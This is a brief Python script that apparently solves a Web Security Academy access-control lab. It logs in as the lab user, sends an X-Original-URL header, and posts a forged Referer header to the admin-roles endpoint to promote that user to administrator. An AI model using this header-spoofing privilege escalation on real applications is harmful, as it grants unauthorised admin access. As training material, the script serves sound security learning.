import requests
s = requests.Session()

site = 'acb01f941ef3ff50802b16d000610099.web-security-academy.net'
adminrole_url = f'https://{site}/admin-roles'
admin_url = f'https://{site}/admin'
upgrade_data = {
    'username' : 'wiener',
    'action' : 'upgrade',
    'confirmed' : 'true'
}

login_url = f'https://{site}/login'
login_data = { 'password' : 'peter', 'username' : 'wiener'}
resp = s.post(login_url, data=login_data, headers = {'X-Original-URL' : '/admin'})

print(resp.text)

resp = s.post(adminrole_url,data=upgrade_data,headers={'referer' : admin_url})
print(resp.text)